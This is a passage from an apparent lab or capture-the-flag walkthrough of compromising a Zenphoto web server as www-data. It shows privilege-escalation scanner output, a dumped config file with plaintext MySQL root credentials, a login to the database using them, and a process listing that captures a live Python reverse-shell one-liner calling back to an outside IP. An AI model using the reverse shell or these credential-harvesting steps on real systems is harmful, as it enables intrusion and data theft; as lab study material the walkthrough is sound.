\e[97m[\e[94mi\e[97m] \e[90mfst500\e[97m Files owned by user 'www-data'\e[90m.................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst510\e[97m SSH files anywhere\e[90m.............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst520\e[97m Check hosts.equiv file and its contents\e[90m......................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst530\e[97m List NFS server shares\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst540\e[97m Dump fstab file\e[90m................................................. \e[90mskip
\e[35m=================================================================(\e[32m system \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys000\e[97m Who is logged in\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys010\e[97m Last logged in users\e[90m............................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msys020\e[97m Does the /etc/passwd have hashes?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys022\e[97m Does the /etc/group have hashes?\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys030\e[97m Can we read shadow files?\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys040\e[97m Check for other superuser accounts\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys050\e[97m Can root user log in via SSH?\e[90m...................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys060\e[97m List available shells\e[90m........................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys070\e[97m System umask in /etc/login.defs\e[90m................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys080\e[97m System password policies in /etc/login.defs\e[90m..................... \e[90mskip
\e[35m===============================================================(\e[32m security \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec000\e[97m Is SELinux present?\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec010\e[97m List files with capabilities\e[90m.................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec020\e[97m Can we write to a binary with caps?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec030\e[97m Do we have all caps in any binary?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec040\e[97m Users with associated capabilities\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec050\e[97m Does current user have capabilities?\e[90m............................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msec060\e[97m Can we read the auditd log?\e[90m..................................... \e[90mnope\e[0;0m
\e[35m========================================================(\e[32m recurrent tasks \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret000\e[97m User crontab\e[90m.................................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret010\e[97m Cron tasks writable by user\e[90m..................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret020\e[97m Cron jobs\e[90m.......................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret030\e[97m Can we read user crontabs\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret040\e[97m Can we list other user cron tasks?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret050\e[97m Can we write to any paths present in cron jobs\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret060\e[97m Can we write to executable paths present in cron jobs\e[90m...........\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -n 200 -r -0 rm
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -n 200 -r -0 rm
\e[90m---\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mret400\e[97m Cron files\e[90m...................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mret500\e[97m User systemd timers\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret510\e[97m Can we write in any system timer?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mret900\e[97m Systemd timers\e[90m.................................................. \e[90mskip
\e[35m================================================================(\e[32m network \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mnet000\e[97m Services listening only on localhost\e[90m............................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mnet010\e[97m Can we sniff traffic with tcpdump?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mnet500\e[97m NIC and IP information\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet510\e[97m Routing table\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet520\e[97m ARP table\e[90m....................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet530\e[97m Nameservers\e[90m..................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet540\e[97m Systemd Nameservers\e[90m............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet550\e[97m Listening TCP\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet560\e[97m Listening UDP\e[90m................................................... \e[90mskip
\e[35m===============================================================(\e[32m services \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv000\e[97m Can we write in service files?\e[90m.................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv010\e[97m Can we write in binaries executed by services?\e[90m.................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv020\e[97m Files in /etc/init.d/ not belonging to root\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv030\e[97m Files in /etc/rc.d/init.d not belonging to root\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv040\e[97m Upstart files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv050\e[97m Files in /usr/local/etc/rc.d not belonging to root\e[90m.............. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv400\e[97m Contents of /etc/inetd.conf\e[90m..................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv410\e[97m Contents of /etc/xinetd.conf\e[90m.................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv420\e[97m List /etc/xinetd.d if used\e[90m...................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv430\e[97m List /etc/init.d/ permissions\e[90m................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv440\e[97m List /etc/rc.d/init.d permissions\e[90m............................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv450\e[97m List /usr/local/etc/rc.d permissions\e[90m............................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv460\e[97m List /etc/init/ permissions\e[90m..................................... \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msrv500\e[97m Can we write in systemd service files?\e[90m.......................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv510\e[97m Can we write in binaries executed by systemd services?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv520\e[97m Systemd files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv900\e[97m Systemd config files permissions\e[90m................................ \e[90mskip
\e[35m===============================================================(\e[32m software \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof000\e[97m Can we connect to MySQL with root/root credentials?\e[90m............. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof010\e[97m Can we connect to MySQL as root without password?\e[90m............... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof015\e[97m Are there credentials in mysql_history file?\e[90m.................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof030\e[97m Installed apache modules\e[90m........................................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof040\e[97m Found any .htpasswd files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof050\e[97m Are there private keys in ssh-agent?\e[90m............................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof060\e[97m Are there gpg keys cached in gpg-agent?\e[90m......................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof070\e[97m Can we write to a ssh-agent socket?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof080\e[97m Can we write to a gpg-agent socket?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof090\e[97m Found any keepass database files?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof100\e[97m Found any 'pass' store directories?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof110\e[97m Are there any tmux sessions available?\e[90m.......................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof120\e[97m Are there any tmux sessions from other users?\e[90m................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof130\e[97m Can we write to tmux session sockets from other users?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof140\e[97m Are any screen sessions available?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof150\e[97m Are there any screen sessions from other users?\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof160\e[97m Can we write to screen session sockets from other users?\e[90m........ \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msof500\e[97m Sudo version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof510\e[97m MySQL version\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof520\e[97m Postgres version\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof530\e[97m Apache version\e[90m.................................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof540\e[97m Tmux version\e[90m.................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msof550\e[97m Screen version\e[90m.................................................. \e[90mskip
\e[35m=============================================================(\e[32m containers \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn000\e[97m Are we in a docker container?\e[90m................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn010\e[97m Is docker available?\e[90m............................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn020\e[97m Is the user a member of the 'docker' group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mctn200\e[97m Are we in a lxc container?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mctn210\e[97m Is the user a member of any lxc/lxd group?\e[90m...................... \e[90mnope\e[0;0m
\e[35m==============================================================(\e[32m processes \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro000\e[97m Waiting for the process monitor to finish\e[90m.......................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro001\e[97m Retrieving process binaries\e[90m.....................................\e[34m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro002\e[97m Retrieving process users\e[90m........................................\e[34m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mpro010\e[97m Can we write in any process binary?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro020\e[97m Processes running with root permissions\e[90m.........................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mpro030\e[97m Processes running by non-root users with shell\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mpro500\e[97m Running processes\e[90m............................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mpro510\e[97m Running process binaries and permissions\e[90m........................ \e[90mskip

\e[35m==================================(\e[32m FINISHED \e[35m)==================================\e[0;0m
www-data@offsecsrv:/tmp$ 

```

## Files Enum

```
cd www
www-data@offsecsrv:/var/www$ ls
ls
index.html  test
www-data@offsecsrv:/var/www$ cd test
cd test
www-data@offsecsrv:/var/www/test$ ls
ls
albums  cache_html  doc_files    index.php  robots.txt  uploaded  zp-data
cache   dev-tools   favicon.ico  plugins    themes      zp-core
www-data@offsecsrv:/var/www/test$ 
www-data@offsecsrv:/var/www/test$ cd zp-data
cd zp-data
www-data@offsecsrv:/var/www/test/zp-data$ ls
ls
security_log.txt  setup_log.txt  t??st.jpg  zp-config.php
www-data@offsecsrv:/var/www/test/zp-data$ cat zp-config.php
cat zp-config.php
<?php /* PUT NOTHING BEFORE THIS LINE, not even a line break! */
global $_zp_conf_vars;
$conf = array();

/** Do not edit above this line. **/
/**********************************/

/*//////////   zenPHOTO Configuration Variables   ///////////////////////////////
Note: zp-config.php.source is the source file for zp-config.php

For most installations Setup.php will copy zp-config.php.source to zp-config.php and 
make the necessary changes to it. Unless this fails you most likely have no need even 
to read this file.

If for some reason setup.php is not able to edit the zp-config.php file and you cannot
fix the file/folder permissions so that it can then you may have copy the 
zp-config.php.source file to zp-config.php and make changes here manually.

Advanced installations may wish to modify the album folder definitions below. 

Also on some servers zenphoto has problems correctly determining the WEB path and
SERVER path. For these cases you will need to implement the path overrides below.
///////////////////////////////////////////////////////////////////////////////*/

////////////////////////////////////////////////////////////////////////////////
// Database Information 
////////////////////////////////////////////////////////////////////////////////
$conf['db_software'] = 'MySQL';                 // someday we may support other databases
/** for historical reasons these fields reference mysql even though the database **
 ** might be a different software                                                **/
$conf['mysql_user'] = 'root';           // Supply your Database user id.
$conf['mysql_pass'] = 'hola';           // Supply your Database password.
$conf['mysql_host'] = 'localhost';  // Supply the name of your Database server.
$conf['mysql_database'] = 'zenphoto';       // Supply the name of Zenphoto's database 
// If you're sharing the database with other tables, use a prefix to be safe.
$conf['mysql_prefix'] = "zp_";

// If you are having problems with displaying some characters you may have to change
// the following:
$conf['UTF-8'] = true;

////////////////////////////////////////////////////////////////////////////////
// zp-config.php required options
////////////////////////////////////////////////////////////////////////////////

// location of album folder. 
// 'album_folder' is the name of the folder for the zenphoto albums.
// 'album_folder_class' determines how to interpret 'album_folder':
//    'std'         --  the folder must be a simple name. It resides in the root 
//                      of the zenphoto installation.
//    'in_webpath'  --  the folder must be the full path of the album folder from 
//                      the WEB root of the zenphoto installation. The WEB root of
//                                                                                      your installation is the folder where your browser looks
//                                                                                      if the link is just your domain (no folders).
//    'external'    --  the folder must be a full server path to the album folder.
//                      Images within an external folder are not visible to web
//                      browsers, so certain features such as flash players cannot
//                      display them
$conf['album_folder'] = '/albums/';
$conf['album_folder_class'] = 'std';

// Server Protocol
// Change this to "https" if you use an HTTPS server (a "https://..." url)
// Otherwise you should leave it at "http"
// NOTE: If you change this on an already installed configuration you will also have
// to change the gallery configuration server protocal option.
$conf['server_protocol'] = "http";
//
//
$conf['FILESYSTEM_CHARSET'] = 'UTF-8';
////////////////////////////////////////////////////////////////////////////////
// Path Overrides
////////////////////////////////////////////////////////////////////////////////
// Uncomment the following two lines ONLY IF YOU'RE HAVING PROBLEMS,
// like "file not found" or "not readable" errors.
// These allow you to override Zenphoto's detection of the correct paths
// on your server, which might work better on some setups.
////////////////////////////////////////////////////////////////////////////////

// define('WEBPATH', '/zenphoto');
// define('SERVERPATH', '/full/server/path/to/zenphoto');

////////////////////////////////////////////////////////////////////////////////
if (!defined('CHMOD_VALUE')) { define('CHMOD_VALUE',0755); }
/** Do not edit below this line. **/
/**********************************/
$_zp_conf_vars = $conf;
unset($conf);

?>
www-data@offsecsrv:/var/www/test/zp-data$ 

```
### HP

```
www-data@offsecsrv:/etc/hp$ cat hplip.conf
cat hplip.conf
# hplip.conf.  Generated from hplip.conf.in by configure.

[hplip]
version=3.10.2

[dirs]
home=/usr/share/hplip
run=/var/run
ppd=/usr/share/ppd/hplip/HP
ppdbase=/usr/share/ppd/hplip
doc=/usr/share/doc/hplip-doc/HTML
icon=no
cupsbackend=/usr/lib/cups/backend
cupsfilter=/usr/lib/cups/filter
drv=/usr/share/cups/drv

# Following values are determined at configure time and cannot be changed.
[configure]
network-build=yes
pp-build=yes
gui-build=yes
scanner-build=yes
fax-build=yes
dbus-build=yes
cups11-build=no
doc-build=yes
shadow-build=no
hpijs-install=yes
foomatic-drv-install=yes
foomatic-ppd-install=yes
foomatic-rip-hplip-install=no
hpcups-install=yes
cups-drv-install=yes
cups-ppd-install=no
internal-tag=3.10.2rc1.9
restricted-build=no
ui-toolkit=qt4
qt3=no
qt4=yes
policy-kit=yes
hpijs-only-build=no
lite-build=no
udev-acl-rules=yes
hpcups-only-build=no
hpijs-only-build=no
www-data@offsecsrv:/etc/hp$
```

## Processes
```
www-data@offsecsrv:/var/www/test$ ps aux | cat
ps aux | cat
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2792  1668 ?        Ss   09:01   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    09:01   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    09:01   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    09:01   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    09:01   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S    09:01   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S    09:01   0:00 [cpuset]
root         8  0.0  0.0      0     0 ?        S    09:01   0:00 [khelper]
root         9  0.0  0.0      0     0 ?        S    09:01   0:00 [netns]
root        10  0.0  0.0      0     0 ?        S    09:01   0:00 [async/mgr]
root        11  0.0  0.0      0     0 ?        S    09:01   0:00 [pm]
root        12  0.0  0.0      0     0 ?        S    09:01   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    09:01   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S    09:01   0:00 [kintegrityd/0]
root        15  0.0  0.0      0     0 ?        S    09:01   0:00 [kblockd/0]
root        16  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpid]
root        17  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpi_notify]
root        18  0.0  0.0      0     0 ?        S    09:01   0:00 [kacpi_hotplug]
root        19  0.0  0.0      0     0 ?        S    09:01   0:00 [ata/0]
root        20  0.0  0.0      0     0 ?        S    09:01   0:00 [ata_aux]
root        21  0.0  0.0      0     0 ?        S    09:01   0:00 [ksuspend_usbd]
root        22  0.0  0.0      0     0 ?        S    09:01   0:00 [khubd]
root        23  0.0  0.0      0     0 ?        S    09:01   0:00 [kseriod]
root        24  0.0  0.0      0     0 ?        S    09:01   0:00 [kmmcd]
root        27  0.0  0.0      0     0 ?        S    09:01   0:00 [khungtaskd]
root        28  0.0  0.0      0     0 ?        S    09:01   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        SN   09:01   0:00 [ksmd]
root        30  0.0  0.0      0     0 ?        S    09:01   0:00 [aio/0]
root        31  0.0  0.0      0     0 ?        S    09:01   0:00 [ecryptfs-kthrea]
root        32  0.0  0.0      0     0 ?        S    09:01   0:00 [crypto/0]
root        35  0.0  0.0      0     0 ?        S    09:01   0:00 [pciehpd]
root        37  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_0]
root        38  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_1]
root        40  0.0  0.0      0     0 ?        S    09:01   0:00 [kstriped]
root        42  0.0  0.0      0     0 ?        S    09:01   0:00 [kmpathd/0]
root        43  0.0  0.0      0     0 ?        S    09:01   0:00 [kmpath_handlerd]
root        44  0.0  0.0      0     0 ?        S    09:01   0:00 [ksnapd]
root        45  0.0  0.0      0     0 ?        S    09:01   0:00 [kondemand/0]
root        46  0.0  0.0      0     0 ?        S    09:01   0:00 [kconservative/0]
root       141  0.0  0.0      0     0 ?        S    09:01   0:00 [mpt_poll_0]
root       149  0.0  0.0      0     0 ?        S    09:01   0:00 [mpt/0]
root       230  0.0  0.0      0     0 ?        S    09:01   0:00 [scsi_eh_2]
root       247  0.0  0.0      0     0 ?        S    09:01   0:00 [jbd2/sda1-8]
root       248  0.0  0.0      0     0 ?        S    09:01   0:00 [ext4-dio-unwrit]
root       291  0.0  0.1   2312  1028 ?        S    09:01   0:00 upstart-udev-bridge --daemon
root       294  0.0  0.1   2788  1288 ?        S<s  09:01   0:00 udevd --daemon
root       511  0.0  0.0      0     0 ?        S    09:01   0:00 [kpsmoused]
root       599  0.0  0.1   2784  1236 ?        S<   09:01   0:00 udevd --daemon
root       600  0.0  0.1   2784  1236 ?        S<   09:01   0:00 udevd --daemon
syslog     642  0.0  0.1  33508  1484 ?        Sl   09:01   0:00 rsyslogd -c4
102        643  0.0  0.0   2776   972 ?        Ss   09:01   0:00 dbus-daemon --system --fork
root       688  0.0  0.4   9504  4464 ?        Ss   09:01   0:00 NetworkManager
root       700  0.0  0.2   4168  2304 ?        S    09:01   0:00 /usr/sbin/modem-manager
avahi      703  0.0  0.1   3020  1596 ?        S    09:01   0:00 avahi-daemon: running [offsecsrv.local]
avahi      707  0.0  0.0   2924   548 ?        Ss   09:01   0:00 avahi-daemon: chroot helper
root       757  0.0  0.0   1788   560 tty4     Ss+  09:01   0:00 /sbin/getty -8 38400 tty4
root       765  0.0  0.0   1788   564 tty5     Ss+  09:01   0:00 /sbin/getty -8 38400 tty5
root       772  0.0  0.0   1788   556 tty2     Ss+  09:01   0:00 /sbin/getty -8 38400 tty2
root       773  0.0  0.0   1788   560 tty3     Ss+  09:01   0:00 /sbin/getty -8 38400 tty3
root       776  0.0  0.0   1788   556 tty6     Ss+  09:01   0:00 /sbin/getty -8 38400 tty6
root       777  0.0  0.0   2044   864 ?        Ss   09:01   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       792  0.0  0.0   2372   892 ?        Ss   09:01   0:00 cron
daemon     793  0.0  0.0   2244   432 ?        Ss   09:01   0:00 atd
mysql      812  0.0  2.1 178828 22472 ?        Ssl  09:01   0:00 /usr/sbin/mysqld
root       867  0.0  0.2   6768  2984 ?        Ss   09:01   0:00 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
root       905  0.0  0.1   4832  1728 ?        S    09:01   0:00 /sbin/wpa_supplicant -u -s
root       987  0.0  0.9  41840  9972 ?        Ss   09:01   0:00 /usr/sbin/apache2 -k start
root      1063  0.0  0.0      0     0 ?        S    09:01   0:00 [vmmemctl]
root      1188  0.0  0.0   1788   560 tty1     Ss+  09:01   0:00 /sbin/getty -8 38400 tty1
root      1366  0.0  0.4  36960  4356 ?        Sl   09:01   0:01 /usr/sbin/vmtoolsd
root      1418  0.0  0.0      0     0 ?        S    09:01   0:00 [flush-8:0]
root      1663  0.0  0.2   5548  2124 ?        Ss   09:04   0:00 /usr/sbin/sshd -D
www-data  2080  0.0  0.5  42192  5820 ?        S    09:30   0:00 /usr/sbin/apache2 -k start
www-data  2104  0.0  0.0   1828   532 ?        S    09:36   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data  2105  0.0  0.4   7740  4268 ?        S    09:36   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data  2106  0.0  0.1   3028  1644 pts/0    Ss   09:36   0:00 /bin/bash
www-data  2225  0.0  0.5  41976  5348 ?        S    09:36   0:00 /usr/sbin/apache2 -k start
www-data 19799  0.0  0.5  41976  5348 ?        S    09:41   0:00 /usr/sbin/apache2 -k start
www-data 19800  0.0  0.5  41976  5348 ?        S    09:41   0:00 /usr/sbin/apache2 -k start
www-data 19806  0.0  0.5  41976  5348 ?        S    09:45   0:00 /usr/sbin/apache2 -k start
www-data 19821  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19829  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19834  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19842  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19845  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19847  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19848  0.0  0.5  41976  5348 ?        S    09:48   0:00 /usr/sbin/apache2 -k start
www-data 19854  0.0  0.5  41976  5348 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data 19855  0.0  0.5  41976  5348 ?        S    09:49   0:00 /usr/sbin/apache2 -k start
www-data 19857  0.0  0.5  41976  5348 ?        S    09:50   0:00 /usr/sbin/apache2 -k start
www-data 19865  0.0  0.5  41976  5344 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19866  0.0  0.5  41976  5340 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19867  0.0  0.5  41976  5340 ?        S    09:52   0:00 /usr/sbin/apache2 -k start
www-data 19868  0.0  0.5  41976  5340 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19873  0.0  0.5  41976  5332 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19874  0.0  0.4  41840  4904 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19876  0.0  0.4  41840  4736 ?        S    09:53   0:00 /usr/sbin/apache2 -k start
www-data 19877  0.0  0.0   2432   972 pts/0    R+   09:53   0:00 ps aux
www-data 19878  0.0  0.0   1788   420 pts/0    S+   09:53   0:00 cat
www-data@offsecsrv:/var/www/test$
```

```
www-data@offsecsrv:/var/www/test$ netstat -ano | grep LISTEN
netstat -ano | grep LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      keepalive (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
unix  2      [ ACC ]     STREAM     LISTENING     3583     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     3852     /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     2387     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     3948     /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     11118    /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     3753     /var/run/avahi-daemon/socket
www-data@offsecsrv:/var/www/test$ 

```

```
www-data@offsecsrv:/var/www/test$ mysql -u root
mysql -u root
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
www-data@offsecsrv:/var/www/test$ 
www-data@offsecsrv:/var/www/test/zp-data$ mysql -uroot -phola
mysql -uroot -phola
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 299
Server version: 5.1.41-3ubuntu12.10 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databses;
show databses;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databses' at line 1
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| zenphoto           |
+--------------------+
3 rows in set (0.00 sec)

mysql> use zenphoto
use zenphoto
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+--------------------+
| Tables_in_zenphoto |
+--------------------+
| zp_admin_to_object |
| zp_administrators  |
| zp_albums          |
| zp_captcha         |
| zp_comments        |
| zp_images          |
| zp_menu            |
| zp_news            |
| zp_news2cat        |
| zp_news_categories |
| zp_obj_to_tag      |
| zp_options         |
| zp_pages           |
| zp_plugin_storage  |
| zp_tags            |
+--------------------+
